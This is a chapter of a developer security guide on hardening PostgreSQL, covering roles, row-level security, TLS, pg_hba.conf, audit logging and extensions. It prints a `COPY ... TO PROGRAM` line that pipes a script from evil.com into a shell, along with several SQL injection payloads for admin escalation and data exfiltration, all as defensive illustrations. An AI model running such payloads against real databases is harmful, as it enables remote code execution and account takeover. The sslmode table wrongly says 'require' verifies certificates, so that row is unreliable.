# Part 6 — PostgreSQL-Specific Security
### Everything Postgres can do to hurt you, and how to make it not

> Most of the OWASP rules apply to any database. This file is the *Postgres-specific* layer: roles, grants, RLS, statements that have their own attack surface, and the configs that matter.

---

## 6.1 Roles and the principle of least privilege

### The mistake 90% of teams make

The app's database user has `SUPERUSER` or at least the `postgres` role. A SQL injection is now RCE via `COPY ... FROM PROGRAM`.

```sql
-- ❌ NEVER do this in app config
GRANT ALL PRIVILEGES ON DATABASE vulntodo TO vulntodo_app;
ALTER USER vulntodo_app WITH SUPERUSER;  -- ← "just for dev"
```

### The right setup

```sql
-- 1. App user — only the minimum
CREATE USER vulntodo_app WITH PASSWORD '...' VALID UNTIL '2026-12-31';
GRANT CONNECT ON DATABASE vulntodo TO vulntodo_app;
GRANT USAGE ON SCHEMA public TO vulntodo_app;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO vulntodo_app;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO vulntodo_app;
-- Future tables
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO vulntodo_app;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT USAGE, SELECT ON SEQUENCES TO vulntodo_app;

-- 2. Migration user — DDL allowed, used only by Alembic/Flyway
CREATE USER vulntodo_migrator WITH PASSWORD '...' VALID UNTIL '2026-12-31';
GRANT CREATE, USAGE ON SCHEMA public TO vulntodo_migrator;
GRANT ALL ON DATABASE vulntodo TO vulntodo_migrator;
-- ↑ only used during deploys, secret rotated, IP-restricted

-- 3. Read-only user — for analytics, BI tools, reporting
CREATE USER vulntodo_reader WITH PASSWORD '...';
GRANT CONNECT ON DATABASE vulntodo TO vulntodo_reader;
GRANT USAGE ON SCHEMA public TO vulntodo_reader;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO vulntodo_reader;

-- 4. Audit writer — only INSERT into audit_log, never UPDATE/DELETE
CREATE USER vulntodo_audit WITH PASSWORD '...';
GRANT INSERT ON audit_log TO vulntodo_audit;
REVOKE UPDATE, DELETE, TRUNCATE ON audit_log FROM vulntodo_audit;
-- ↑ even if the app is compromised, the audit log can't be tampered with
```

### Verify

```sql
-- Check that the app user really is least-privilege
SELECT rolname, rolsuper, rolcreatedb, rolcreaterole, rolcanlogin
  FROM pg_roles WHERE rolname = 'vulntodo_app';
-- rolsuper should be FALSE
```

---

## 6.2 The `COPY ... FROM PROGRAM` RCE

The number-one reason to never give your app user superuser:

```sql
-- Requires superuser. If the app user is superuser and there's a SQLi:
COPY (SELECT '') TO PROGRAM 'curl evil.com/shell.sh | sh';
-- ↑ RCE as the postgres OS user
```

**Mitigation:** never give the app user `SUPERUSER`. If you do, you're one SQLi away from root.

Even without superuser, watch out for:
- `COPY ... FROM 'filename'` — reads files the postgres user can read (e.g., `/etc/passwd` if misconfigured).
- `lo_import()` — same.
- `dblink` extension — if installed, opens a tunnel to other databases.

---

## 6.3 Row-Level Security (RLS) — the defense-in-depth for multi-tenant apps

RLS lets the database itself enforce "user X can only see row Y". Even if your app has a bug, the DB won't leak.

```sql
-- 1. Enable RLS on a table
ALTER TABLE todos ENABLE ROW LEVEL SECURITY;

-- 2. Force it for the table owner too (otherwise table-owner bypasses)
ALTER TABLE todos FORCE ROW LEVEL SECURITY;

-- 3. Define policies
CREATE POLICY todo_owner_select ON todos
  FOR SELECT TO vulntodo_app
  USING (owner_id = current_setting('app.current_user_id')::int);

CREATE POLICY todo_owner_modify ON todos
  FOR ALL TO vulntodo_app
  USING (owner_id = current_setting('app.current_user_id')::int)
  WITH CHECK (owner_id = current_setting('app.current_user_id')::int);
```

In your app, set the per-request user identity:

```python
@app.middleware("http")
async def set_rls_user(request: Request, call_next):
    auth = request.headers.get("authorization", "")
    if auth.startswith("Bearer "):
        try:
            payload = jwt.decode(auth.split()[1], SECRET, algorithms=[ALG])
            user_id = payload["sub"]
        except JWTError:
            user_id = "0"   # anonymous
    else:
        user_id = "0"
    async with engine.begin() as conn:
        await conn.execute(text(f"SET LOCAL app.current_user_id = '{int(user_id)}'"))
        # ↑ wait, that f-string is a SQL injection in the middleware!
    # correct way:
    async with engine.begin() as conn:
        await conn.execute(
            text("SET LOCAL app.current_user_id = :uid"),
            {"uid": int(user_id)}
        )
        # ↑ bind parameter — safe
    return await call_next(request)
```

> **Note:** `SET LOCAL` only lasts for the current transaction. You'll need to set it at the start of every transaction, or use connection-pool-level `SET` and reset it. Or use `pgAudit` with `set_config()` per request.

### When RLS bites back

- **Performance**: the planner needs to know the policy expression. Test with `EXPLAIN`.
- **Superuser bypasses RLS by default** — that's why we made the app user non-superuser.
- **Migrations** can fail if they don't set the right context. Use a separate migration user.
- **`USING` vs `WITH CHECK`**: `USING` filters which rows you see; `WITH CHECK` validates which rows you can write.

---

## 6.4 SQL injection — the Postgres-specific flavors

Most SQLi is generic (Part 2 A03), but a few are Postgres-specific.

### Stacked queries
```sql
-- Postgres allows multiple statements separated by ;
'; UPDATE users SET is_admin = true WHERE id = 1; --
```
Most drivers (asyncpg, psycopg3) **don't** allow stacked queries by default. But `asyncpg.execute()` does support it if you pass a multi-statement string. Use the ORM or `text(..., bindparams(...))`.

### `RETURNING` data exfiltration
```sql
'; UPDATE users SET password = 'x' WHERE id = 1 RETURNING password, is_admin; --
```
The injected `RETURNING` causes the result of the malicious update to be returned. The attacker exfiltrates `is_admin` and any other field.

### JSONB / array injection
```sql
' AND '{"$ne": null}'::jsonb @> tags
-- if you build JSONB queries with f-strings
```
The fix is the same — bind parameters, or use SQLAlchemy's `JSONB.contains()` etc.

### Exotic functions that have security implications
- `pg_read_file()` — read server files. Requires superuser.
- `lo_import()` / `lo_export()` — read/write large objects. Requires superuser.
- `dblink` — connect to other DBs. Requires explicit install + privilege.
- `COPY ... FROM PROGRAM` — RCE. Requires superuser.
- `pg_stat_statements` — can leak query text (which may contain PII). Be careful with query logging.

The app user should have **none** of these.

### Tool
- **sqlmap** — automated SQLi detection.
- **pgAudit** — logs every statement.
- **Semgrep** `python.sqlalchemy.security` — catches `text(f"...")` patterns.

---

## 6.5 Connection security

### TLS for the connection
```python
# asyncpg
engine = create_async_engine(
    "postgresql+asyncpg://user:pass@host/db",
    connect_args={"ssl": "require"},  # or "verify-full"
)
```

`sslmode` options in libpq:
| Mode | Verifies cert | Verifies hostname | Safe? |
|------|---------------|-------------------|-------|
| `disable` | no | no | no |
| `allow` | no | no | no |
| `prefer` | no | no | no |
| `require` | yes (encrypted) | no | somewhat |
| `verify-ca` | yes | no | yes |
| `verify-full` | yes | yes | **yes** |

In production, **always `verify-full`**. For cloud providers, download their CA bundle and pass it.

### `pg_hba.conf` — host-based authentication
- Bind to localhost, not `0.0.0.0`.
- Use `scram-sha-256` or `md5`, never `trust` or `password`.
- Limit by IP / subnet.
- For remote access, require SSL.

```
# /etc/postgresql/16/main/pg_hba.conf
# TYPE  DATABASE        USER            ADDRESS         METHOD
local   all             postgres                        peer
local   vulntodo        vulntodo_app                    scram-sha-256
host    vulntodo        vulntodo_app    10.0.0.0/8      scram-sha-256
hostssl vulntodo        vulntodo_app    0.0.0.0/0       scram-sha-256
host    all             all             127.0.0.1/32    reject
```

---

## 6.6 `pg_hba.conf` and `postgresql.conf` — the must-set knobs

`postgresql.conf`:
```ini
ssl = on
ssl_cert_file = '/etc/ssl/certs/server.crt'
ssl_key_file = '/etc/ssl/private/server.key'
log_connections = on
log_disconnections = on
log_statement = 'ddl'                # or 'mod' or 'all' (careful with PII)
log_min_duration_statement = 500    # log slow queries
shared_preload_libraries = 'pgaudit'  # for fine-grained audit
password_encryption = scram-sha-256
```

`pg_hba.conf`:
```ini
# see above
```

---

## 6.7 Audit logging with `pgaudit`

```sql
-- Install
CREATE EXTENSION pgaudit;
-- Configure
ALTER SYSTEM SET pgaudit.log = 'write, ddl';
SELECT pg_reload_conf();
```

`pgaudit` logs every write, DDL, role change, etc. Ship to your SIEM.

### Application-level audit log

```sql
CREATE TABLE audit_log (
  id BIGSERIAL PRIMARY KEY,
  ts TIMESTAMPTZ NOT NULL DEFAULT now(),
  user_id INT,
  action TEXT NOT NULL,
  target_id INT,
  ip INET,
  user_agent TEXT,
  details JSONB
);
REVOKE UPDATE, DELETE, TRUNCATE ON audit_log FROM vulntodo_app;
-- ↑ even if the app is compromised, the audit log is append-only
GRANT INSERT, SELECT ON audit_log TO vulntodo_app;
```

In the app, use a separate DB session (or `SET LOCAL ROLE vulntodo_audit`) when inserting audit rows.

---

## 6.8 Backups and PII

- **Backups must be encrypted** (at rest + in transit).
- **Backups must be access-controlled** — anyone with the backup can read everything.
- **Test restoring** the backup. A backup you've never restored is a backup that doesn't exist.
- **Retention** — GDPR right-to-erasure means you may need to delete on request. But backups can't be "selectively" deleted. The legal interpretation: if you can't restore a deleted user's data (because it's encrypted with a now-deleted key, or because the backup is rotated out within the retention window), you comply.

### Anonymized / synthetic data for non-prod
```sql
-- Generate a sanitized copy for staging
CREATE TABLE users_staging AS
  SELECT
    md5(id::text) AS id_hash,
    'user_' || row_number() OVER () AS username,
    -- never copy real emails / passwords
    'redacted+' || row_number() OVER () || '@example.com' AS email,
    'REDACTED' AS password
  FROM users
  WHERE false;  -- no rows in dev
```

---

## 6.9 Postgres extensions — the safe list and the scary list

### Generally safe
- `pgcrypto` — `gen_random_uuid()`, `digest()`, etc. **Read the docs** — `pgp_sym_encrypt` is useful.
- `citext` — case-insensitive text.
- `uuid-ossp` — `uuid_generate_v4()`. Superseded by `gen_random_uuid()` from core.
- `hstore` — key-value. (No SQLi risk if you use it correctly.)

### Powerful, requires review
- `pg_stat_statements` — performance, can leak query text.
- `postgis` — geographic types. No security risk per se, but a complex dependency.
- `timescaledb` — same.

### Don't install unless you know why
- `dblink` — connects to other DBs. Often used for cross-tenant data leakage attacks.
- `file_fdw` — reads files. With superuser access, RCE-equivalent.
- `pg_background` — can spawn background workers. Requires superuser.

---

## 6.10 Protecting against DB connection-string leakage

The connection string has a password. Common leak paths:
- Logged in error traceback
- Logged by `pgaudit` if you log statements with parameters
- In environment variables that show up in `/proc/*/environ`
- In a `.env` file that gets committed

Mitigations:
- Use a secret manager (AWS Secrets Manager, GCP Secret Manager, Vault, Doppler).
- Rotate the password every 90 days.
- Use short-lived tokens (RDS IAM, Cloud SQL IAM).
- Strip passwords from logs: `ALTER SYSTEM SET log_parameter_max_length = 0;` to prevent parameter logging.
- Don't print the DSN in error messages — use a custom error handler that says "DB error" without the URL.

```python
# Bad: this logs the DSN
logger.exception(e)
# Good: scrub the DSN
def safe_msg(e):
    msg = str(e)
    return re.sub(r"postgresql://[^@]+@", "postgresql://***:***@", msg)
```

---

## 6.11 The 10-minute Postgres hardening checklist

```sql
-- 1. App user is not superuser
SELECT rolname, rolsuper FROM pg_roles WHERE rolname = 'vulntodo_app';
-- Should be: rolsuper = f

-- 2. App user has only the grants it needs
SELECT grantee, privilege_type, table_name
  FROM information_schema.role_table_grants
  WHERE grantee = 'vulntodo_app';

-- 3. No trust/peer auth from non-localhost
SELECT * FROM pg_hba_file_rules() WHERE auth_method IN ('trust', 'peer');

-- 4. RLS enabled on tenant-scoped tables
SELECT schemaname, tablename, rowsecurity
  FROM pg_tables WHERE schemaname = 'public';
-- rowsecurity should be 't' for tenant tables

-- 5. SSL on
SHOW ssl;  -- 'on'

-- 6. Passwords are SCRAM
SELECT rolname, rolpassword IS NOT NULL AS has_pw FROM pg_authid;
SHOW password_encryption;  -- 'scram-sha-256'

-- 7. pgAudit is logging writes
SELECT * FROM pg_available_extensions WHERE name = 'pgaudit';

-- 8. Backups exist and are tested
-- (manual — pgBackRest, barman, wal-g)
```

---

## 6.12 Postgres-specific gotchas to remember

| Gotcha | What it does | Fix |
|--------|--------------|-----|
| `gen_random_uuid()` is in core since PG 13 | `uuid-ossp` extension is no longer needed | Use core function |
| `pg_trgm` can be used for fuzzy search | `similarity()` can be slow / DoS-able | Rate-limit the endpoint |
| `LISTEN/NOTIFY` | If you build pub/sub on it, no auth on subscribers | Use a real broker with auth |
| `SECURITY DEFINER` functions | Run as the function owner, bypassing RLS | Audit every `SECURITY DEFINER` function |
| `DO $$ ... $$` | Anonymous PL/pgSQL block | Don't accept user input into `DO` |
| `lo_import`/`lo_export` | Reads/writes files | Require superuser — your app user shouldn't have it |
| `pg_dump` without `--no-owner` | Restores the dump as superuser | Use `--no-owner` and restore as a non-superuser |
| `CITEXT` columns | "alice" == "ALICE" | Watch for case-bypass in uniqueness constraints |
| `NULLS NOT DISTINCT` | In PG 15+ — `NULL = NULL` is now considered duplicate | Update unique constraints to opt in if needed |
| Generated columns | Computed on read or write | Watch for info disclosure via the generation expression |
| `IMMUTABLE` markers | Used by the planner — wrongly marking a function `IMMUTABLE` lets indexes lie | Don't mark user-defined functions `IMMUTABLE` lightly |

---

## 6.13 One page: what to give the DBA / DevOps team

```
✓ App DB user: CONNECT, USAGE, SELECT, INSERT, UPDATE, DELETE only.
✓ Migration DB user: separate, used only by Alembic/Flyway.
✓ Audit-writer DB user: INSERT only on audit_log.
✓ Read-only DB user: for analytics/BI.
✓ pg_hba.conf: scram-sha-256 + hostssl + IP allowlist.
✓ postgresql.conf: ssl=on, pgaudit preloaded, log_statement='mod' (or 'ddl').
✓ RLS enabled and FORCED on tenant tables.
✓ App user's password is in a secret manager, rotated every 90 days.
✓ Backups are encrypted, access-controlled, restore-tested monthly.
✓ Extensions: only the approved list. No dblink, file_fdw, pg_background.
✓ Monitoring: pg_stat_statements, pgaudit, alert on COPY/lo_import/REVOKE statements.
```

Now open `07-ai-vibe-coding.md` — secure coding in the age of AI coding assistants.
